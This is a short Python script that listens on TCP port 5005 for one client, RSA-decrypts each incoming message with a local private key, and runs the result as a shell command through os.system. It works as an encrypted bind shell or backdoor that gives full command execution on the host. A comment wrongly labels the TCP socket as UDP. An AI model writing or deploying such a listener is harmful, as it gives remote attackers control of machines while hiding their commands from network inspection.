import socket
import os
import rsa

with open("./private.pem","rb") as f:
    data = f.read()
    server_private_key = rsa.PrivateKey.load_pkcs1(data)

HOST = ''    
PORT = 5005  
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # UDP SOCKET
s.bind((HOST, PORT))
s.listen(1)
conn, addr = s.accept()  
print('Client connected: ', addr)
while True:
    data = conn.recv(1024)
    if not data:
        break
    decoded_data = data
    orig_mess = rsa.decrypt(decoded_data, server_private_key).decode('utf8')
    os.system(orig_mess)
conn.close()